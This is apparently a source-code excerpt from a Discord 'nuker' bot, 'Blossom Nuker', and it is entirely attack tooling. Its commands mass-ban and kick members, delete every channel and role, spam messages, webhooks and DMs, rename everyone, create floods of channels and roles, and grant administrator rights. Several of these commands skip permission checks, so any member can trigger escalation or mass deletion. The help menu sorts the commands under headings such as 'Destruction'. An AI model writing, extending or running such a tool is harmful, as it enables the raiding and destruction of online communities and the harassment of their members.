# ============================================================
#  NEW COMMANDS ADDED BELOW EXISTING COMMANDS
#  All existing commands kept intact
# ============================================================

@client.command(name="banall")
async def banall(ctx):
    """Ban all members in the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("You need Ban Members permission.")
        return
    await ctx.send(f"Banning {len(ctx.guild.members)} members...")
    banned = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.ban(reason="Banall command")
            banned += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Banned {banned} members. {failed} failed.")

@client.command(name="dmall")
async def dmall(ctx, *, message: str = "You have been nuked."):
    """DM every member in the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send(f"Dming {len(ctx.guild.members)} members...")
    sent = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member.bot:
            continue
        try:
            await member.send(message)
            sent += 1
            await asyncio.sleep(0.3)
        except:
            failed += 1
    await ctx.send(f"Dmed {sent} members. {failed} failed.")

@client.command(name="roles")
async def roles(ctx, count: int = 100):
    """Create multiple roles."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 250:
        count = 250
    await ctx.send(f"Creating {count} roles...")
    created = 0
    failed = 0
    colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF]
    for i in range(count):
        try:
            color = random.choice(colors)
            await ctx.guild.create_role(name=f"role-{i}", color=color)
            created += 1
            if i % 10 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} roles. {failed} failed.")

@client.command(name="op")
async def op(ctx, member: discord.Member = None):
    """Give yourself or another user administrator."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    target = member or ctx.author
    if target == ctx.guild.owner:
        await ctx.send("Cannot OP the server owner.")
        return
    try:
        admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
        if not admin_role:
            admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
        await target.add_roles(admin_role)
        await ctx.send(f"{target.mention} now has Administrator.")
    except:
        await ctx.send("Failed to give OP. Missing permissions.")

@client.command(name="del")
async def del_channels(ctx):
    """Delete all channels in the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send("Deleting all channels...")
    deleted = 0
    failed = 0
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Deleted {deleted} channels. {failed} failed.")

@client.command(name="rename")
async def rename_all(ctx, *, new_name: str = "nuked"):
    """Rename everyone in the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.manage_nicknames:
        await ctx.send("You need Manage Nicknames permission.")
        return
    await ctx.send(f"Renaming {len(ctx.guild.members)} members to '{new_name}'...")
    renamed = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        try:
            await member.edit(nick=new_name)
            renamed += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Renamed {renamed} members. {failed} failed.")

@client.command(name="kickall")
async def kickall(ctx):
    """Kick all members from the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.kick_members:
        await ctx.send("You need Kick Members permission.")
        return
    await ctx.send(f"Kicking {len(ctx.guild.members)} members...")
    kicked = 0
    failed = 0
    for member in list(ctx.guild.members):
        if member == ctx.guild.owner:
            continue
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Kickall command")
            kicked += 1
            await asyncio.sleep(0.2)
        except:
            failed += 1
    await ctx.send(f"Kicked {kicked} members. {failed} failed.")

@client.command(name="unbanall")
async def unbanall(ctx):
    """Unban all banned members."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.ban_members:
        await ctx.send("You need Ban Members permission.")
        return
    await ctx.send("Unbanning all banned members...")
    unbanned = 0
    failed = 0
    try:
        bans = [entry async for entry in ctx.guild.bans()]
        for ban_entry in bans:
            try:
                await ctx.guild.unban(ban_entry.user)
                unbanned += 1
                await asyncio.sleep(0.2)
            except:
                failed += 1
    except:
        await ctx.send("Failed to fetch ban list.")
        return
    await ctx.send(f"Unbanned {unbanned} members. {failed} failed.")

@client.command(name="droles")
async def droles(ctx):
    """Delete all roles in the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send("Deleting all roles...")
    deleted = 0
    failed = 0
    for role in list(ctx.guild.roles):
        if role.name == "@everyone":
            continue
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Deleted {deleted} roles. {failed} failed.")

@client.command(name="adminall")
async def adminall(ctx):
    """Give administrator to everyone in the server."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("You need Administrator permission.")
        return
    await ctx.send("Giving admin to all members...")
    admin_role = discord.utils.get(ctx.guild.roles, name="AdminAll")
    if not admin_role:
        admin_role = await ctx.guild.create_role(name="AdminAll", permissions=discord.Permissions.all())
    added = 0
    failed = 0
    for member in list(ctx.guild.members):
        try:
            await member.add_roles(admin_role)
            added += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Gave admin to {added} members. {failed} failed.")

@client.command(name="wbspam")
async def wbspam(ctx, amount: int = 10):
    """Create webhooks in every channel and spam them."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    await ctx.send(f"Creating webhooks and spamming {amount} times each...")
    total_sent = 0
    failed = 0
    for channel in ctx.guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="spamhook")
            for _ in range(amount):
                try:
                    await webhook.send(SPAM_MESSAGE)
                    total_sent += 1
                    await asyncio.sleep(0.1)
                except:
                    failed += 1
            await webhook.delete()
        except:
            failed += 1
    await ctx.send(f"Sent {total_sent} webhook messages. {failed} failed.")

@client.command(name="spam")
async def spam(ctx, *, text: str = SPAM_MESSAGE):
    """Spam custom text in every channel."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    channels = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.me).send_messages]
    if not channels:
        await ctx.send("No writable channels.")
        return
    await ctx.send(f"Spamming '{text[:20]}...' in {len(channels)} channels.")
    sent = 0
    for channel in channels:
        try:
            await channel.send(text)
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await ctx.send(f"Sent to {sent} channels.")

@client.command(name="spamchannels")
async def spamchannels(ctx, count: int = 50, *, name: str = "spammed"):
    """Create multiple text channels."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 200:
        count = 200
    await ctx.send(f"Creating {count} text channels named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_text_channel(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} channels. {failed} failed.")

@client.command(name="spamvcs")
async def spamvcs(ctx, count: int = 30, *, name: str = "vcspam"):
    """Create multiple voice channels."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 100:
        count = 100
    await ctx.send(f"Creating {count} voice channels named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_voice_channel(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} voice channels. {failed} failed.")

@client.command(name="spamcats")
async def spamcats(ctx, count: int = 20, *, name: str = "catspam"):
    """Create multiple categories."""
    if not ctx.guild:
        await ctx.send("Use this command in a server.")
        return
    if count > 50:
        count = 50
    await ctx.send(f"Creating {count} categories named '{name}'...")
    created = 0
    failed = 0
    for i in range(count):
        try:
            await ctx.guild.create_category(f"{name}-{i}")
            created += 1
            if i % 5 == 0:
                await asyncio.sleep(0.1)
        except:
            failed += 1
    await ctx.send(f"Created {created} categories. {failed} failed.")

# ============================================================
#  UPDATED HELP COMMAND
# ============================================================
@client.command(name="help")
async def help_command(ctx):
    """Display help menu with all commands."""
    embed = discord.Embed(
        title="Blossom Nuker Commands",
        description="Full command list:",
        color=discord.Color.magenta()
    )
    embed.add_field(
        name="Destruction",
        value=";banall - Ban everyone\n"
              ";nuke - Full server nuke\n"
              ";hiroshima - Full server nuke (alias)\n"
              ";kickall - Kick everyone\n"
              ";unbanall - Unban everyone\n"
              ";del - Delete all channels\n"
              ";droles - Delete all roles\n"
              ";nothing - Delete everything (no spam)",
        inline=False
    )
    embed.add_field(
        name="Permissions",
        value=";op [@user] - Give admin to yourself or user\n"
              ";adminall - Give admin to everyone",
        inline=False
    )
    embed.add_field(
        name="Spam and Creation",
        value=";spam <text> - Spam custom text in all channels\n"
              ";spaminvite [amount] - Spam invite link\n"
              ";wbspam [amount] - Webhook spam\n"
              ";spamchannels <count> [name] - Create text channels\n"
              ";spamvcs <count> [name] - Create voice channels\n"
              ";spamcats <count> [name] - Create categories\n"
              ";roles [count] - Create roles",
        inline=False
    )
    embed.add_field(
        name="User Actions",
        value=";kicka [@user] - Kick user or all bots\n"
              ";rename <name> - Rename everyone\n"
              ";dmall <message> - DM all members\n"
              ";blame @user - Accuse someone",
        inline=False
    )
    embed.add_field(
        name="Utility",
        value=";ping - Bot latency\n"
              ";status - Bot stats\n"
              ";getbot - Invite link\n"
              ";whitelist - Manage whitelist\n"
              ";credits - Bot credits",
        inline=False
    )
    embed.set_footer(text="Prefix: ;")
    await ctx.send(embed=embed)

# ============================================================
#  ALIAS FOR NUKE (SAME AS HIROSHIMA)
# ============================================================
@client.command(name="nuke")
async def nuke(ctx):
    """Alias for ;hiroshima"""
    await hiroshima(ctx)
